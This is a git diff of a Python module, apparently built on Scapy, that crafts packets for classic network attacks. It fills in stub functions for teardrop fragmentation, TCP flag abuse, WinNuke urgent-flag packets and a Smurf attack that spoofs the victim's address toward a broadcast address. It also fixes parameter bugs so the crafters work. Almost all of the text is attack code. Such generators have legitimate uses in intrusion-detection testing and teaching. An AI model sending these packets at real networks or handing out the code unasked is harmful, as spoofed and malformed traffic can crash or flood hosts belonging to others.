@@ -37,7 +37,10 @@ def ipv4_land_base(smac, target):
     return pkt
 
 
-def ipv4_tear_drop(flags, frag = 0, proto = 17, dst = "192.168.15.70", data = ""):
+def ipv4_tear_drop(smac, flags, frag = 0, proto = 17, dst = "192.168.15.70", data = ""):
+    data_link_layer = Ether(
+        src = smac
+    )
     network_layer = IP(
         id = 28752,
         flags = flags,
@@ -46,29 +49,51 @@ def ipv4_tear_drop(flags, frag = 0, proto = 17, dst = "192.168.15.70", data = ""
         proto = proto,
         dst = dst
     )
-    data = data
     pkt = network_layer / data
     return pkt
 
 
-def ipv4_tcp_flag():
+def ipv4_tcp_flag(smac, src, dst, flags):
+    data_link_layer = Ether(
+        src = smac
+    )
     network_layer = IP(
         src = src,
         dst = dst
     )
     transport_layer = TCP(
-        flag = flag
+        flags = flags
     )
-    pkt = network_layer / transport_layer
+    pkt = data_link_layer / network_layer / transport_layer
     return pkt
 
 
-def ipv4_winnuke():
-    pass
+def ipv4_winnuke(smac, src, dst):
+    data_link_layer = Ether(
+        src = smac
+    )
+    network_layer = IP(
+        src = src,
+        dst = dst
+    )
+    transport_layer = TCP(
+        flags = "U"
+    )
+    pkt = data_link_layer / network_layer / transport_layer
+    return pkt
 
 
-def ipv4_smurf():
-    pass
+def ipv4_smurf(target_mac, target_ip, broadcast):
+    data_link_layer = Ether(
+        src = target_mac,
+        dst = "ff:ff:ff:ff:ff:ff"
+    )
+    network_layer = IP(
+        src = target_ip,
+        dst = broadcast
+    ) / ICMP()
+    pkt = data_link_layer / network_layer
+    return pkt
 
 
 def ipv4_ip_option():
